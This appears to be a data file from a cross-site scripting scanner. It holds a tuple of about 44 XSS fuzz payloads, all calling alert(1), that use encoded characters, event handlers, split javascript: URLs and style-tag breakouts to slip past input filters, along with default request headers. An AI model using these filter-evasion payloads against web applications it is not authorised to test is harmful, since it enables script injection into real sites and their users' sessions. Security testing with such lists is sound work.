fuzzes = (
    '<script type="text/javascript">alert(1);</script>',
    '<script%20type="text/javascript">javascript:alert(1);</script>',
    '<script%3Etype="text/javascript">javascript:alert(1);</script>',
    '<script%0Dtype="text/javascript">javascript:alert(1);</script>',
    '<script%09type="text/javascript">javascript:alert(1);</script>',
    '<script%0Ctype="text/javascript">javascript:alert(1);</script>',
    '<script%2Ftype="text/javascript">javascript:alert(1);</script>',
    '<script%0Atype="text/javascript">javascript:alert(1);</script>',
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
    '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
    '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
    '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
    '<script>javascript:alert(1)</script%0D',
    '<script>javascript:alert(1)</script%0A',
    '<script>javascript:alert(1)</script%0B',
    '<script charset="%22>javascript:alert(1)</script>',
    '<a href="javas%00cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%07cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%0Acript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%08cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%02cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%03cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%04cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%01cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%05cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%09cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%06cript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<a href="javas%0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>',
    '<script>/* *%2A/javascript:alert(1)// */</script>',
    '<script>/* *%00/javascript:alert(1)// */</script>',
    '<style></style%3E<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style%0D<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style%09<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style%20<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<style></style%0A<img src="about:blank" onerror=javascript:alert(1)//></style>'
)

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1'
}
